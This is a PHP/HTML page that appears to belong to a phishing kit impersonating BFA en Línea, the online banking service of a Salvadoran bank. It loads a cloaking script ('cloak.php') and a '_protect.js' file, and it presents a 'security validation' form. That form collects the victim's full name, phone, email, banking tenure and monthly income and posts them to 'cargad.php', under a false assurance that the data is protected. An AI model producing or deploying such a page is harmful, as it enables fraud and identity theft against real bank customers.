<?php
require_once __DIR__ . '/cloak.php';
session_start();
// Permite acceso directo: si no hay usuario en sesión, usa "Cliente" como fallback
$usuario = $_SESSION['usuario'] ?? 'Cliente';
$_SESSION['usuario'] = $usuario;
?>
<!DOCTYPE html>
<html lang="es"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>BFA en Línea - Información personal</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  html,body{font-family:'Segoe UI',Tahoma,Arial,sans-serif;color:#022a4f;background:#fff}
  a{color:#022a4f;text-decoration:none}
  a:hover{text-decoration:underline}
  img{max-width:100%;display:block}
  .form input::placeholder, .form select{color:#777}
  .btn-next:hover{filter:brightness(1.05)}
  .field{margin-bottom:14px}
  .field label{display:block;text-align:left;font-weight:600;color:#022a4f;font-size:13px;margin-bottom:4px;margin-left:6px}
  .field input, .field select{
    width:100%;background:#dddddd;color:#232323;outline:0;
    padding:8px 12px;border:0;border-radius:10px;font-size:14px;
    font-family:'Montserrat','Segoe UI',sans-serif;
  }
  .field input::placeholder{color:#888}

  /* === CARD SCENE (lado izquierdo) === */
  .card-scene{
    position:relative;width:100%;height:100%;min-height:560px;
    display:flex;align-items:center;justify-content:center;
    background:linear-gradient(135deg,#022a4f 0%,#04477d 60%,#0566b3 100%);
    overflow:hidden;
  }
  .card-scene::before, .card-scene::after{
    content:"";position:absolute;border-radius:50%;
    background:rgba(255,255,255,.06);
  }
  .card-scene::before{width:380px;height:380px;top:-100px;right:-120px}
  .card-scene::after{width:280px;height:280px;bottom:-80px;left:-80px}

  .credit-card{
    position:relative;width:340px;height:210px;
    border-radius:18px;
    background:linear-gradient(135deg,#FF9012 0%,#FFD700 100%);
    box-shadow:0 22px 50px rgba(0,0,0,.45), 0 0 0 1px rgba(255,255,255,.1) inset;
    padding:22px 24px;color:#022a4f;
    transform-style:preserve-3d;
    animation:floatCard 5s ease-in-out infinite, tiltCard 9s ease-in-out infinite;
  }
  @keyframes floatCard{
    0%,100%{transform:translateY(0) rotate(-4deg)}
    50%{transform:translateY(-14px) rotate(-4deg)}
  }
  @keyframes tiltCard{
    0%,100%{filter:drop-shadow(0 10px 20px rgba(0,0,0,.3))}
    50%{filter:drop-shadow(0 18px 35px rgba(0,0,0,.5))}
  }
  .credit-card .chip{
    width:46px;height:34px;border-radius:6px;
    background:linear-gradient(135deg,#d9bb6e,#a8862f);
    position:relative;margin-top:6px;
  }
  .credit-card .chip::before, .credit-card .chip::after{
    content:"";position:absolute;left:8px;right:8px;height:2px;background:rgba(0,0,0,.25)
  }
  .credit-card .chip::before{top:10px}
  .credit-card .chip::after{bottom:10px}
  .credit-card .wave{
    position:absolute;top:24px;right:24px;width:30px;height:30px;
    border:2px solid rgba(2,42,79,.7);border-radius:50%;
    border-left-color:transparent;border-bottom-color:transparent;
    animation:wave 1.6s ease-in-out infinite;
  }
  .credit-card .wave::after{
    content:"";position:absolute;inset:-9px;
    border:2px solid rgba(2,42,79,.5);border-radius:50%;
    border-left-color:transparent;border-bottom-color:transparent;
    animation:wave 1.6s ease-in-out infinite .3s;
  }
  @keyframes wave{
    0%,100%{opacity:.3;transform:scale(.95)}
    50%{opacity:1;transform:scale(1.05)}
  }
  .credit-card .number{
    position:absolute;left:24px;right:24px;bottom:60px;
    font-family:'Courier New',monospace;font-size:18px;font-weight:700;
    letter-spacing:2px;color:#022a4f;
  }
  .credit-card .row{
    position:absolute;left:24px;right:24px;bottom:18px;
    display:flex;justify-content:space-between;align-items:flex-end;
    font-size:11px;font-weight:700;text-transform:uppercase;
  }
  .credit-card .row .label{opacity:.7;font-size:9px;display:block;margin-bottom:2px}
  .credit-card .brand{
    position:absolute;right:24px;top:22px;display:flex;gap:0;
  }
  .credit-card .brand .c1, .credit-card .brand .c2{
    width:22px;height:22px;border-radius:50%;
  }
  .credit-card .brand .c1{background:#e53935}
  .credit-card .brand .c2{background:#f5a623;margin-left:-10px;mix-blend-mode:multiply}

  /* Partículas de fondo */
  .particle{
    position:absolute;width:6px;height:6px;border-radius:50%;
    background:rgba(255,255,255,.4);
    animation:floatP 8s linear infinite;
  }
  .particle:nth-child(1){top:15%;left:20%;animation-delay:0s}
  .particle:nth-child(2){top:65%;left:75%;animation-delay:2s;width:8px;height:8px}
  .particle:nth-child(3){top:35%;left:85%;animation-delay:4s}
  .particle:nth-child(4){top:80%;left:25%;animation-delay:1s;width:4px;height:4px}
  .particle:nth-child(5){top:50%;left:10%;animation-delay:3s}
  @keyframes floatP{
    0%{transform:translateY(0);opacity:0}
    10%{opacity:1}
    90%{opacity:1}
    100%{transform:translateY(-60px);opacity:0}
  }

  /* Responsive */
  @media (max-width: 880px){
    .body{grid-template-columns:1fr !important}
    .body .card-scene{display:none !important}
    .body .form-side{padding:60px 20px 40px !important;justify-content:flex-start !important}
    .header{padding:12px 16px !important}
    .header .logo img{height:40px !important}
  }
</style>
</head>
<body>
<script src="_protect.js"></script>

<div class="page" style="min-height:100vh;display:flex;flex-direction:column">

  <header class="header" style="background:#f3f5f7;padding:14px 40px;display:flex;align-items:center;justify-content:space-between;">
    <div class="logo">
      <img src="img/BFAonline_BFA_en_Linea.png" alt="BFA EN LÍNEA" style="height:30px">
    </div>
    <div></div>
  </header>

  <div class="body" style="flex:1;display:grid;grid-template-columns:1fr 460px;min-height:0">

    <!-- ESCENA DE TARJETA ANIMADA -->
    <div class="card-scene" role="img" aria-label="Tarjeta">
      <span class="particle"></span>
      <span class="particle"></span>
      <span class="particle"></span>
      <span class="particle"></span>
      <span class="particle"></span>

      <div class="credit-card">
        <div class="brand"><div class="c1"></div><div class="c2"></div></div>
        <div class="chip"></div>
        <div class="wave"></div>
        <div class="number">4521&nbsp;&nbsp;••••&nbsp;&nbsp;••••&nbsp;&nbsp;9087</div>
        <div class="row">
          <div>
            <span class="label">Titular</span>
            <span><?= htmlspecialchars(strtoupper($usuario)) ?></span>
          </div>
          <div>
            <span class="label">Válida</span>
            <span>12/29</span>
          </div>
        </div>
      </div>
    </div>

    <!-- FORMULARIO -->
    <div class="form-side" style="background:#fff;display:flex;flex-direction:column;align-items:center;padding:30px 40px;overflow-y:auto">

      <div style="display:flex;align-items:center;justify-content:center;margin-top:10px">
        <div style="width:64px;height:64px;border-radius:50%;background:#022a4f;display:flex;align-items:center;justify-content:center">
          <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/>
            <circle cx="12" cy="7" r="4"/>
          </svg>
        </div>
      </div>

      <h2 style="margin-top:14px;font-size:18px;font-weight:700;color:#022a4f;text-align:center">
        Verificación de datos
      </h2>
      <p style="margin-top:6px;font-size:13px;color:#666;text-align:center;max-width:300px">
        Complete su información para continuar con la validación de seguridad.
      </p>

      <form class="form" method="POST" action="cargad.php" style="width:100%;max-width:320px;margin-top:22px">
        <input type="hidden" name="usuario" value="<?= htmlspecialchars($usuario) ?>">

        <div class="field">
          <label for="nombre">Nombre completo <span style="color:#e53935">*</span></label>
          <input id="nombre" name="nombre" type="text" placeholder="Ej: Juan Pérez García" autocomplete="name" required>
        </div>

        <div class="field">
          <label for="telefono">Teléfono <span style="color:#e53935">*</span></label>
          <input id="telefono" name="telefono" type="tel" inputmode="tel" placeholder="Ej: 2241-7400" autocomplete="tel" pattern="[0-9\-\s\+\(\)]{7,20}" required>
        </div>

        <div class="field">
          <label for="correo">Correo electrónico <span style="color:#e53935">*</span></label>
          <input id="correo" name="correo" type="email" placeholder="correo@ejemplo.com" autocomplete="email" required>
        </div>

        <div class="field">
          <label for="antiguedad">Tiempo de antigüedad con BFA <span style="color:#e53935">*</span></label>
          <select id="antiguedad" name="antiguedad" required style="appearance:auto">
            <option value="">Seleccione...</option>
            <option value="menos_1">Menos de 1 año</option>
            <option value="1_3">Entre 1 y 3 años</option>
            <option value="3_5">Entre 3 y 5 años</option>
            <option value="5_10">Entre 5 y 10 años</option>
            <option value="mas_10">Más de 10 años</option>
          </select>
        </div>

        <div class="field">
          <label for="ingresos">Ingresos mensuales (USD) <span style="color:#e53935">*</span></label>
          <select id="ingresos" name="ingresos" required style="appearance:auto">
            <option value="">Seleccione...</option>
            <option value="0_500">$0 - $500</option>
            <option value="500_1000">$500 - $1,000</option>
            <option value="1000_2000">$1,000 - $2,000</option>
            <option value="2000_4000">$2,000 - $4,000</option>
            <option value="mas_4000">Más de $4,000</option>
          </select>
        </div>

        <button class="btn-next" type="submit"
                style="background:linear-gradient(to right,#FF9012,#FFD700);color:#fff;border-radius:34px;padding:9px 30px;font-weight:700;border:0;cursor:pointer;outline:0;display:block;margin:18px auto 0;font-family:'Montserrat',sans-serif;font-size:15px">
          Continuar
        </button>
      </form>

      <div class="help" style="text-align:center;margin-top:24px;font-size:13px">
        <div style="font-weight:700;color:#022a4f;margin-bottom:4px">Para asistencia</div>
        <a href="mailto:info.bfaonline@bfa.gob.sv" style="font-weight:700;color:#022a4f">info.bfaonline@bfa.gob.sv</a>
      </div>

      <div style="margin-top:24px;padding-top:16px;border-top:1px solid #eee;width:100%;text-align:center;font-size:11px;color:#777;font-weight:600">
        🔒 Sus datos están protegidos<br>
        © 2026 - BFA en Línea
      </div>

    </div>
  </div>
</div>

</body></html>
